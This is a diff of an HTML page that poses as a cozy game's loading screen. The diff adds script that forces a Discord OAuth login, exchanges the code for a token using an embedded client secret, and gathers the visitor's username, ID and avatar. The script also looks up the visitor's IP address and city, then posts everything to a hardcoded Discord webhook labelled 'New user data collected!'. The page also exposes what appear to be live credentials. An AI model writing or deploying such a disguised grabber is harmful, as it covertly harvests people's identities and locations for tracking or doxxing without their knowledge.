@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LucasEM's Very Cozy Game</title>
+    <title>LucasEM's very cozy game</title>
     <style>
-        /* Loading screen styles */
         #loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
             flex-direction: column;
+            color: white;
+            font-family: Arial, sans-serif;
         }
         .spinner {
             border: 8px solid #f3f3f3;
@@ -28,12 +28,6 @@
             animation: spin 2s linear infinite;
             margin-bottom: 20px;
         }
-        #loading-text {
-            font-size: 24px;
-            color: white;
-            font-family: Arial, sans-serif;
-            font-weight: bold;
-        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -41,48 +35,111 @@
     </style>
 </head>
 <body>
-    <!-- Loading screen -->
     <div id="loading-screen">
         <div class="spinner"></div>
-        <div id="loading-text">LucasEM's cozy survival game</div>
+        <h1>Loading LucasEM's Cozy Game...</h1>
     </div>
 
     <script>
-        // Discord client ID and redirect URL
-        const clientId = '1328323151330938910';  // Your Discord Client ID
-        const redirectUri = 'https://tinyurl.com/Lucas-play-game';  // Your Redirect URL
-        const webhookURL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs";  // Webhook URL
+        const CLIENT_ID = "1328323151330938910"; // Your Discord Client ID
+        const CLIENT_SECRET = "OuNiL3Z79GqGJqeLbh_gExtA3ABNGABj"; // Your Discord Client Secret
+        const REDIRECT_URI = "https://tinyurl.com/Lucas-play-game"; // Your Redirect URI
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs"; // Your Webhook URL
+        const API_ENDPOINT = "https://discord.com/api";
 
-        // Function to perform Discord OAuth2 login
-        function loginWithDiscord() {
-            const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=identify`;
-            window.location.href = authUrl;  // Redirect to Discord login
+        // Function to fetch IP address
+        function getIP() {
+            return fetch("https://ipinfo.io/json?token=abfa2c858d87e3")
+                .then(response => response.json())
+                .then(data => ({
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country
+                }))
+                .catch(() => ({ ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" }));
         }
 
-        // Call the login function when the page loads
-        loginWithDiscord();
+        // Extract the authorization code from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get("code");
 
-        // Fetch Discord user and send data
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.hash.substr(1));
-            const accessToken = urlParams.get('access_token');
+        if (code) {
+            // Fetch IP address
+            getIP().then(ipData => {
+                // Exchange the authorization code for an access token
+                fetch(`${API_ENDPOINT}/oauth2/token`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: new URLSearchParams({
+                        client_id: CLIENT_ID,
+                        client_secret: CLIENT_SECRET,
+                        grant_type: "authorization_code",
+                        code: code,
+                        redirect_uri: REDIRECT_URI
+                    })
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const accessToken = data.access_token;
 
-            if (accessToken) {
-                // Send data to the backend
-                fetch(`/discord?access_token=${accessToken}`, {
-                    method: 'GET',
-                }).then(response => response.text())
-                  .then(data => {
-                      console.log(data);
-                      // Hide the loading screen
-                      document.getElementById('loading-screen').style.display = 'none';
-                  })
-                  .catch(error => {
-                      console.error('Error:', error);
-                      alert('An error occurred!');
-                  });
-            }
-        };
+                        // Fetch user info using the access token
+                        fetch(`${API_ENDPOINT}/users/@me`, {
+                            headers: {
+                                Authorization: `Bearer ${accessToken}`
+                            }
+                        })
+                            .then(response => response.json())
+                            .then(user => {
+                                // Prepare data for the webhook
+                                const webhookData = {
+                                    content: "New user data collected!",
+                                    embeds: [
+                                        {
+                                            title: "Discord User Info",
+                                            color: 0x3498db,
+                                            fields: [
+                                                { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
+                                                { name: "User ID", value: user.id, inline: true },
+                                                { name: "IP Address", value: ipData.ip, inline: false },
+                                                { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, inline: false }
+                                            ],
+                                            thumbnail: {
+                                                url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
+                                            }
+                                        }
+                                    ]
+                                };
+
+                                // Send data to Discord Webhook
+                                fetch(WEBHOOK_URL, {
+                                    method: "POST",
+                                    headers: {
+                                        "Content-Type": "application/json"
+                                    },
+                                    body: JSON.stringify(webhookData)
+                                })
+                                    .then(() => {
+                                        document.getElementById("loading-screen").innerHTML = "<h1>Data Sent Successfully!</h1>";
+                                    })
+                                    .catch(error => {
+                                        console.error("Error sending webhook:", error);
+                                        document.getElementById("loading-screen").innerHTML = "<h1>Error Sending Data.</h1>";
+                                    });
+                            });
+                    })
+                    .catch(error => {
+                        console.error("Error exchanging code for token:", error);
+                        document.getElementById("loading-screen").innerHTML = "<h1>Error Authenticating.</h1>";
+                    });
+            });
+        } else {
+            // Redirect user to Discord OAuth2 authorization
+            const authURL = `${API_ENDPOINT}/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
+            window.location.href = authURL;
+        }
     </script>
 </body>
 </html>
